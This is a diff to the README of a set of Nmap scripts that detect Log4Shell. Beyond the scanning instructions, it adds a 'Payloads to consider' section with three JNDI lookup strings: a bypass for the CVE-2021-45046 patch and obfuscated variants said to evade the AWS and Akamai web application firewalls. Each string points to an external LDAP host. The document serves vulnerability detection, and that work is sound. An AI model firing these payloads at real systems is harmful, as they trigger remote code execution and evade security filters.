@@ -8,9 +8,6 @@ NSE scripts check most popular exposed services on the Internet. It is basic scr
 
 Note that NSE scripts will only issue the requests to the services. Nmap will not report vulnerable hosts, but you have to check DNS logs to determine vulnerability. If you do not specify payload manually, NSE scripts will use dnslog.cn by default. That means requests will be seen by dnslog.cn.
 
-Also note that DNS resolution with prefixes combination in a expression for log4j-core <= 2.7 seems not supported. So, testing with something like ```${java:os}``` could lead to false negatives.
-Therefore, better to have few false positives than negatives.
-
 ## Quick with help of dnslog.cn
 
 Position to directory where these scripts are located and issue following commands (Nmap will retrieve dnslog.cn automatically).
@@ -27,6 +24,22 @@ cd nse-log4shell
 nmap -sV -T4 -v --script=%cd%/ scanme.nmap.org
 ```
 
+## Payloads to consider
+
+new patch bypass on v2.15.0 (CVE-2021-45046), thanks to @marcioalm ([tweet](https://twitter.com/marcioalm/status/1471740771581652995)):
+```
+${jndi:ldap://127.0.0.1#{{target}}.xxx.dnslog.cn:1389/a}
+```
+
+AWS bypass (thanks to @11xuxx - [tweet](https://twitter.com/11xuxx/status/1471826191724257285)):
+```
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://mydogsbutt.com:1389/o}
+```
+
+Akamai bypass (thanks to @ozgur_bbh - [tweet](https://twitter.com/ozgur_bbh/status/1471803792572223493)):
+```
+${jndi${123%25ff:-}:ldap://HOST:PORT/a}
+```
 
 ## Manual configuration
 
@@ -158,6 +171,9 @@ You can check specific URI with following example:
 ```http-log4shell.url=/my/application/uri```
 
 It will check via HTTP headers and cookie. If you need to check post/get forms. You should check http-spider-log4shell. Still, it is best to use web scanner with support for log4j.
+
+Also note that DNS resolution with prefixes combination in a expression for log4j-core <= 2.7 seems not supported. So, testing with something like ```${java:os}``` could lead to false negatives.
+Therefore, better to have few false positives than negatives.
 
 # References
 
